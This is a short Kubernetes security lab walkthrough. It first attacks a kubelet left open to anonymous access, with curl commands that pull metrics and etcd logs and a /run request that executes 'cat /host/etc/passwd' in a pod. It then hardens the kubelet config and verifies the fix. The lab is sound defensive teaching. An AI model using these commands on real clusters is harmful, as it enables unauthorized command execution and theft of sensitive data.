# Kubelet

## Attack

Before fixing the kubelet we will try to get sensitive data via the kubelet.

### Preparations

```bash
# exit the VM - for being in the Google Cloud Shell again
exit

# store the external IP of the worker node
export IP=$(gcloud compute instances list --filter="name=kubernetes-security" --format json | jq .[].networkInterfaces[].accessConfigs[].natIP | tr -d \")
```

### Getting sensitive data from the kubelet

```bash
# getting metrics from the kubelet
curl -k https://$IP:10250/metrics

# getting log infos from the kubelet
curl -k https://$IP:10250/logs/pods/ | grep etcd

# getting logs from etcd eg `curl -k https://$IP:10250/logs/pods/kube-system_etcd-kubernetes-security_87a0e13f2b523002a1f9bd2decbc296d/etcd/0.log`
curl -k https://$IP:10250/logs/pods/<ETCD_POD>/etcd/0.log

# getting infos from the host
curl -XPOST -k https://$IP:10250/run/default/my-suboptimal-pod/my-ubuntu -d "cmd=cat /host/etc/passwd"
```

## Avoiding the Attack

### SSH into the VM

```bash
gcloud compute ssh root@kubernetes-security --zone europe-west3-a
```

### vi the kubelet config

``` bash
vi /var/lib/kubelet/config.yaml
```

### Fix Authentication

```yaml
...
authentication:
  anonymous:
    enabled: true # <= change to false
...    
```

### Fix Authorization

```yaml
...
authorization:
  mode: AlwaysAllow # <= change to Webhook
...  
```

### Restart the kubelet and check the status

```bash
systemctl restart kubelet

systemctl status kubelet
```

### Verify kubelet is now safe again

```bash
# exit the VM - for being in the Google Cloud Shell again
exit

# try to attack the kublet atain - now you will get an `Unauthorized` response
curl -XPOST -k https://$IP:10250/run/default/my-suboptimal-pod/my-ubuntu -d "cmd=cat /host/etc/passwd"
```
